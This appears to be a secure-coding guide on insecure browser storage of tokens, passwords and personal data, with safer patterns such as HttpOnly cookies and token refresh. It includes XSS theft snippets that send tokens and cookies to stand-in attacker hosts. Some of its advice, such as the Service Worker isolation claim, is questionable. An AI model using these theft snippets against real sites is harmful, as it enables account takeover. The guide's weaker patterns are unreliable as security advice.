# Insecure Data Storage

## Definition

Insecure data storage is a vulnerability where sensitive information is stored in a way that is easily accessible to attackers. In web applications, this primarily involves storing sensitive data in browser storage mechanisms like `localStorage`, `sessionStorage`, or cookies without proper protection.

The fundamental issue is that any JavaScript code running on a page (including malicious code injected via XSS) can access this data. Additionally, browser storage is persistent and can be read by browser developer tools, compromised extensions, or malware on the user's computer.

Sensitive data that should never be stored client-side includes: authentication tokens, passwords, API keys, personal identification information, health data, financial information, and other private/confidential data.

---

## Browser Storage Mechanisms Comparison

### localStorage

```javascript
// Storage mechanism
localStorage.setItem('key', 'value');
const value = localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear(); // Removes all

// Characteristics:
// - Persists until explicitly cleared
// - Domain-scoped (different domains have separate storage)
// - Accessible via JavaScript (window.localStorage)
// - Survives browser restart
// - Limited to ~5-10MB per origin
// - Synchronous API (blocking)

// VULNERABLE: Storing auth token
localStorage.setItem('authToken', 'eyJhbGc...');
// Any XSS can steal it:
// new Image().src = 'https://evil.com/steal?token=' + localStorage.getItem('authToken')
```

### sessionStorage

```javascript
// Storage mechanism
sessionStorage.setItem('key', 'value');
const value = sessionStorage.getItem('key');
sessionStorage.removeItem('key');
sessionStorage.clear();

// Characteristics:
// - Cleared when tab/window closes
// - Domain and tab-scoped
// - Accessible via JavaScript
// - Limited to ~5-10MB per origin
// - Synchronous API

// VULNERABLE: Still accessible to XSS
// Slightly better than localStorage because it clears on page close
// But still accessible to JavaScript while page is open
sessionStorage.setItem('userRole', 'admin');
// XSS can still steal it while page is open
```

### Cookies

```javascript
// Storage mechanism
document.cookie = 'name=value; path=/; max-age=3600';
// Reading: document.cookie returns all accessible cookies as string

// Characteristics:
// - Can be set to expire or be persistent
// - Sent automatically with HTTP requests
// - Can be HttpOnly (inaccessible to JavaScript)
// - Can be Secure (HTTPS only)
// - Can be SameSite (cross-site request protection)
// - Limited to ~4KB per cookie
// - Asynchronous transmission with requests

// SAFER: HttpOnly cookies
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict;
// JavaScript cannot access HttpOnly cookies
// XSS cannot steal HttpOnly cookies!

// VULNERABLE: Regular cookies
document.cookie = 'sessionId=abc123'; // Accessible to JavaScript
// XSS can steal it:
// new Image().src = 'https://evil.com/steal?cookie=' + document.cookie
```

### Comparison Table

| Feature | localStorage | sessionStorage | Cookies |
|---------|---|---|---|
| **Persistence** | Until cleared | Tab closed | Configurable |
| **Scope** | Domain | Domain + Tab | Domain (configurable path) |
| **JavaScript Access** | Full | Full | Full (unless HttpOnly) |
| **Auto-send with HTTP** | No | No | Yes |
| **Size Limit** | ~5-10MB | ~5-10MB | ~4KB |
| **HttpOnly Option** | No | No | Yes |
| **Secure (HTTPS only)** | No | No | Yes |
| **SameSite Protection** | No | No | Yes |
| **Accessible to XSS** | Yes | Yes | Yes* |

*Except HttpOnly cookies

---

## What Should NEVER Be Stored Client-Side

### 1. Authentication Tokens

```javascript
// VULNERABLE: Storing auth token in localStorage
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
localStorage.setItem('authToken', token); // ❌ DANGEROUS

// If XSS occurs, attacker steals the token
// Then uses it to impersonate the user
```

### 2. Passwords

```javascript
// VULNERABLE: Never store passwords client-side
const password = 'MySecurePassword123';
localStorage.setItem('password', password); // ❌ EXTREMELY DANGEROUS

// Even encrypted passwords should not be stored
// Always fetch from secure server when needed
```

### 3. API Keys and Secrets

```javascript
// VULNERABLE: Exposing API keys
const apiKey = 'sk_live_abcd1234...';
localStorage.setItem('apiKey', apiKey); // ❌ DANGEROUS

// API key in client-side code is easily compromised
// Always keep secrets on the server
// Have server proxy API calls
```

### 4. Personal Identifiable Information (PII)

```javascript
// VULNERABLE: Storing sensitive personal data
const user = {
  ssn: '123-45-6789',
  creditCard: '4532-1111-2222-3333',
  bankAccountNumber: '0123456789'
};
localStorage.setItem('userData', JSON.stringify(user)); // ❌ DANGEROUS

// PII should be stored on secure servers
// Only send what's necessary to the client
```

### 5. Health and Financial Information

```javascript
// VULNERABLE: Health/financial data
const medicalInfo = {
  diagnosis: 'Diabetes Type 2',
  medications: ['Metformin', 'Lisinopril'],
  allergies: ['Penicillin']
};
sessionStorage.setItem('medical', JSON.stringify(medicalInfo)); // ❌ DANGEROUS

// Keep sensitive health/financial data on server
// Don't transmit to client unless absolutely necessary
// Use secure encrypted channels
```

---

## XSS-Based Token Theft Scenario

```javascript
// Normal application code:
// User logs in, server sends back a token
const token = 'abc123xyz789'; // Received from server via Set-Cookie header
localStorage.setItem('authToken', token); // Stored in localStorage

// Then malicious code is injected (via XSS):
const injectedCode = `
  const token = localStorage.getItem('authToken');
  const req = new Image();
  req.src = 'https://attacker.com/steal?token=' + token;
  // Or more sophisticated:
  fetch('https://attacker.com/log-theft', {
    method: 'POST',
    body: JSON.stringify({
      token: token,
      location: window.location.href,
      userAgent: navigator.userAgent,
      cookies: document.cookie
    })
  });
`;

eval(injectedCode); // XSS executes this code

// Attacker now has the user's authentication token
// Can use it to:
// - Impersonate the user
// - Access their account
// - Perform actions on their behalf
// - Download their data
```

---

## Secure Storage Patterns

### Pattern 1: HttpOnly Cookies (Server-Side)

```javascript
// Server-side (Express.js)
app.post('/api/login', (req, res) => {
  const user = authenticateUser(req.body.email, req.body.password);

  if (user) {
    const token = generateJWT(user);

    // Set as HttpOnly cookie - JavaScript cannot access it
    res.cookie('authToken', token, {
      httpOnly: true,     // Inaccessible to JavaScript (prevents XSS theft)
      secure: true,       // HTTPS only (prevents network sniffing)
      sameSite: 'strict', // Not sent in cross-site requests (prevents CSRF)
      maxAge: 3600000     // 1 hour expiration
    });

    res.json({ success: true, message: 'Logged in' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Client-side
// JavaScript CANNOT access the token:
console.log(document.cookie); // Doesn't show authToken
console.log(localStorage.getItem('authToken')); // null

// But the browser automatically sends it with requests:
// GET /api/user HTTP/1.1
// Cookie: authToken=...

// Even if XSS occurs:
// eval('const token = localStorage.getItem("authToken")'); // null (safe)
// The token is already protected by HttpOnly
```

### Pattern 2: In-Memory Token Storage

```javascript
// Store token in JavaScript memory, not persistent storage
let authToken = null;

app.post('/api/login', async (req, res) => {
  const user = authenticateUser(req.body.email, req.body.password);

  if (user) {
    const token = generateJWT(user);

    // Send to client
    res.json({
      success: true,
      token: token,
      expiresIn: 3600
    });
  }
});

// Client-side
async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();

  // Store token in memory only
  authToken = data.token; // Not in localStorage/sessionStorage

  // Forget token on page reload
  // User must log in again
}

function getAuthToken() {
  // Return token from memory
  return authToken; // null if page reloaded
}

// Use in requests
fetch('/api/protected', {
  headers: {
    'Authorization': `Bearer ${getAuthToken()}`
  }
});

// Advantages:
// - XSS cannot steal from persistent storage (only from memory of current page)
// - Page reload clears token (requires re-login)
// - Token never stored on disk

// Disadvantages:
// - User must re-login on page reload
// - Less convenient UX
// - Still vulnerable to XSS during the current session
```

### Pattern 3: Short-Lived Tokens with Refresh Pattern

```javascript
// Server-side
const jwt = require('jsonwebtoken');

app.post('/api/login', (req, res) => {
  const user = authenticateUser(req.body);

  if (user) {
    // Short-lived access token (15 minutes)
    const accessToken = jwt.sign(
      { userId: user.id },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    // Longer-lived refresh token (7 days)
    const refreshToken = jwt.sign(
      { userId: user.id, type: 'refresh' },
      process.env.REFRESH_SECRET,
      { expiresIn: '7d' }
    );

    // Return access token to client, store refresh in HttpOnly cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });

    res.json({
      success: true,
      accessToken: accessToken,
      expiresIn: 900 // 15 minutes
    });
  }
});

// Refresh token endpoint
app.post('/api/refresh', (req, res) => {
  // Refresh token comes from HttpOnly cookie (automatic)
  // Verify it and issue new access token

  try {
    const refreshToken = req.cookies.refreshToken;
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

    const newAccessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (e) {
    res.status(401).json({ error: 'Refresh token invalid' });
  }
});

// Client-side
let accessToken = null;

async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();
  accessToken = data.accessToken; // In memory
  startTokenRefreshTimer(data.expiresIn);
}

function startTokenRefreshTimer(expiresIn) {
  // Refresh before expiration (e.g., 5 minutes before)
  const refreshTime = (expiresIn - 300) * 1000;

  setTimeout(async () => {
    const response = await fetch('/api/refresh', {
      method: 'POST',
      credentials: 'include'
    });

    const data = await response.json();
    accessToken = data.accessToken; // Get new token
    startTokenRefreshTimer(900); // 15 minutes
  }, refreshTime);
}

// Use token
async function fetchProtectedData() {
  const response = await fetch('/api/user', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });

  return response.json();
}

// Advantages:
// - Access token is short-lived (15 min)
// - Even if XSS steals it, it expires soon
// - Refresh token is HttpOnly (protected from XSS)
// - User stays logged in longer (refresh token is 7 days)
// - Refresh token rotation possible (server can invalidate)
```

### Pattern 4: Using Service Workers for Secure Storage

```javascript
// Service Worker (separate from main page context)
// Register in main script:
navigator.serviceWorker.register('/sw.js');

// sw.js (Service Worker)
self.addEventListener('message', (event) => {
  const { action, token } = event.data;

  if (action === 'SET_TOKEN') {
    // Store in Service Worker memory
    this.authToken = token;
    event.ports[0].postMessage({ success: true });
  } else if (action === 'GET_TOKEN') {
    // Return token from Service Worker
    event.ports[0].postMessage({ token: this.authToken });
  }
});

// Main application
const port = new MessageChannel();

// Set token
navigator.serviceWorker.controller.postMessage(
  { action: 'SET_TOKEN', token: 'abc123xyz' },
  [port.port2]
);

// Get token
async function getAuthToken() {
  const { port1, port2 } = new MessageChannel();

  navigator.serviceWorker.controller.postMessage(
    { action: 'GET_TOKEN' },
    [port2]
  );

  return new Promise((resolve) => {
    port1.onmessage = (event) => {
      resolve(event.data.token);
    };
  });
}

// Advantages:
// - Token stored in Service Worker (separate context)
// - XSS on main page cannot access Service Worker storage directly
// - More complex but better isolation
// - Browser support: Modern browsers only
```

### Pattern 5: Encrypted Client-Side Storage

```javascript
// Use TweetNaCl.js or similar for encryption
const nacl = require('tweetnacl');
const crypto = require('crypto');

// Encryption key (derived from password/device)
function deriveKey(password, salt) {
  return crypto
    .pbkdf2Sync(password, salt, 100000, 32, 'sha256');
}

// Encrypt token before storing
function encryptToken(token, password) {
  const salt = crypto.randomBytes(16);
  const nonce = nacl.randomBytes(nacl.secretbox.nonceLength);
  const key = deriveKey(password, salt);

  const encrypted = nacl.secretbox(
    Buffer.from(token),
    nonce,
    key
  );

  return {
    encrypted: encrypted.toString('hex'),
    nonce: nonce.toString('hex'),
    salt: salt.toString('hex')
  };
}

function decryptToken(encrypted, password) {
  const key = deriveKey(password, Buffer.from(encrypted.salt, 'hex'));
  const nonce = Buffer.from(encrypted.nonce, 'hex');
  const box = Buffer.from(encrypted.encrypted, 'hex');

  const decrypted = nacl.secretbox.open(box, nonce, key);

  return Buffer.from(decrypted).toString();
}

// Usage
const encryptedData = encryptToken('abc123xyz', userPassword);
localStorage.setItem('authToken', JSON.stringify(encryptedData));

// Later:
const encrypted = JSON.parse(localStorage.getItem('authToken'));
const token = decryptToken(encrypted, userPassword);

// Advantages:
// - Encrypted storage (visible in localStorage but encrypted)
// - Requires password/key to decrypt
// - Somewhat protects from casual inspection

// Disadvantages:
// - Key must be available (in memory or password)
// - XSS can still steal if it captures decrypted token
// - False sense of security if key is weak
```

---

## Best Practices Checklist

1. **Never Store Sensitive Data Client-Side**
   - Authentication tokens (unless HttpOnly cookies)
   - Passwords
   - API keys
   - Credit card numbers
   - SSN or other PII
   - Anything marked as "confidential"

2. **Use HttpOnly Cookies for Authentication**
   ```javascript
   // Server-side (Express)
   res.cookie('sessionId', token, {
     httpOnly: true,
     secure: true,
     sameSite: 'strict'
   });

   // JavaScript cannot access it
   // XSS cannot steal it
   // Browser sends automatically with requests
   ```

3. **Use Short-Lived Access Tokens**
   - Access token: 15 minutes
   - Refresh token: 7 days (in HttpOnly cookie)
   - Automatic refresh on expiration

4. **Store Non-Sensitive Data Securely**
   ```javascript
   // OK to store non-sensitive data in sessionStorage
   sessionStorage.setItem('currentPage', 'dashboard');
   sessionStorage.setItem('userPreferences', JSON.stringify({
     theme: 'dark',
     language: 'en'
   }));

   // Clear on logout
   sessionStorage.clear();
   ```

5. **Implement Logout That Clears Everything**
   ```javascript
   function logout() {
     // Clear all storage
     localStorage.clear();
     sessionStorage.clear();

     // Server-side logout
     fetch('/api/logout', { method: 'POST' })
       .then(() => {
         // Redirect to login
         window.location.href = '/login';
       });
   }
   ```

6. **Set Secure Cookie Attributes**
   ```javascript
   res.cookie('sessionId', token, {
     httpOnly: true,      // Prevents JavaScript access
     secure: true,        // HTTPS only
     sameSite: 'strict',  // No cross-site requests
     maxAge: 3600000      // Expires after 1 hour
   });
   ```

7. **Use HTTPS Exclusively**
   - Prevents network sniffing
   - Enables `Secure` flag on cookies
   - Required for sensitive data

8. **Implement Content Security Policy**
   ```http
   Content-Security-Policy:
     default-src 'self';
     script-src 'self';
   ```
   - Reduces XSS risk
   - Limits what malicious scripts can do

9. **Validate and Sanitize on Server**
   - Never trust client-side storage
   - Verify tokens on every request
   - Validate token signatures
   - Check token expiration

10. **Regular Security Audits**
    - Test for XSS vulnerabilities
    - Review what data is stored
    - Check cookie attributes
    - Monitor data transmission

11. **Use Secrets Management for Server**
    - Store keys in environment variables
    - Use services like AWS Secrets Manager
    - Rotate keys regularly
    - Never commit secrets to git

12. **Educate Users**
    - Don't share authentication tokens
    - Use strong unique passwords
    - Enable two-factor authentication
    - Be aware of phishing attacks

---

## Token Refresh Strategy Implementation

```javascript
// Complete secure token management system

// Constants
const ACCESS_TOKEN_LIFETIME = 15 * 60; // 15 minutes in seconds
const REFRESH_BUFFER = 5 * 60; // Refresh 5 minutes before expiry

// State
let accessToken = null;
let tokenExpiresAt = null;
let refreshTimeout = null;

// Check if token needs refresh
function shouldRefreshToken() {
  if (!accessToken || !tokenExpiresAt) {
    return false;
  }

  const now = Date.now() / 1000;
  return now > (tokenExpiresAt - REFRESH_BUFFER);
}

// Refresh token from server
async function refreshAccessToken() {
  try {
    const response = await fetch('/api/refresh', {
      method: 'POST',
      credentials: 'include' // Include HttpOnly cookies
    });

    if (response.ok) {
      const data = await response.json();
      accessToken = data.accessToken;
      tokenExpiresAt = Date.now() / 1000 + ACCESS_TOKEN_LIFETIME;
      scheduleTokenRefresh();
      return true;
    } else if (response.status === 401) {
      // Refresh token expired, need to login again
      handleTokenExpired();
      return false;
    }
  } catch (error) {
    console.error('Token refresh failed:', error);
    handleTokenExpired();
    return false;
  }
}

// Schedule automatic token refresh
function scheduleTokenRefresh() {
  // Clear existing timeout
  if (refreshTimeout) {
    clearTimeout(refreshTimeout);
  }

  if (!tokenExpiresAt) {
    return;
  }

  const now = Date.now() / 1000;
  const timeUntilRefresh = (tokenExpiresAt - REFRESH_BUFFER - now) * 1000;

  if (timeUntilRefresh > 0) {
    refreshTimeout = setTimeout(refreshAccessToken, timeUntilRefresh);
  }
}

// Get current access token, refreshing if needed
async function getAccessToken() {
  if (shouldRefreshToken()) {
    await refreshAccessToken();
  }

  return accessToken;
}

// Make authenticated request
async function fetchWithAuth(url, options = {}) {
  const token = await getAccessToken();

  if (!token) {
    throw new Error('Not authenticated');
  }

  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };

  return fetch(url, { ...options, headers });
}

// Handle token expiration
function handleTokenExpired() {
  accessToken = null;
  tokenExpiresAt = null;
  clearTimeout(refreshTimeout);

  // Redirect to login
  window.location.href = '/login';
}

// Login
async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

  if (response.ok) {
    const data = await response.json();
    accessToken = data.accessToken;
    tokenExpiresAt = Date.now() / 1000 + ACCESS_TOKEN_LIFETIME;
    scheduleTokenRefresh();
    return true;
  }

  return false;
}

// Logout
async function logout() {
  accessToken = null;
  tokenExpiresAt = null;
  clearTimeout(refreshTimeout);

  await fetch('/api/logout', {
    method: 'POST',
    credentials: 'include'
  });

  window.location.href = '/login';
}

// Usage
async function loadUserData() {
  const response = await fetchWithAuth('/api/user');
  return response.json();
}
```

---

## Related Reading

- OWASP: Insecure Direct Object References (IDOR)
- OWASP: Sensitive Data Exposure
- CWE-434: Unrestricted Upload of File with Dangerous Type
- CWE-922: Insecure Storage of Sensitive Information
- RFC 6265: HTTP State Management Mechanism (Cookies)
- RFC 7234: HTTP Caching
- OWASP: Authentication Cheat Sheet
- JWT Security Best Practices
